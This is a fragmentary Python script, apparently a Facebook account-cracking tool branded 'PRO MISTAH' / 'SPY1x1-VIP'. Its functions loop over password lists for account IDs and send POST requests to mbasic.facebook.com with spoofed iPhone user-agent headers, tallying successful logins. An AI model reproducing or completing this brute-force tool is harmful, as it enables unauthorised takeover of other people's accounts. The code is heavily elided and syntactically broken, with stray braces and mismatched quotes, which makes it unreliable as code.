...
def menu_apikey():
  ...
  print(f"""\x1b[1;97m
    ...
    │ [✓] VERSION  : 0.2                    │
    │ [✓] POWER BY : \033[1;32mPRO MISTAH \033[1;37m            │
    └───────────────────────────────────────┘""")                                           
...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua=random.choice('Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/40.0 Mobile/12F69 Safari/600.1.4',})
                        head = 'mbasic.facebook.com',
    'method': 'POST',
	'scheme': 'https',
...
def rcrack_free(idf,pwv):
	...
	#		print(idf+'|'+ps)
			...
			sys.stdout.write(f'\r\r\033[1;37m [SPY1x1-VIP] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			pro = random.choice('Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/40.0 Mobile/12F69 Safari/600.1.4',})
			...
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', "Chromium";v="100"',
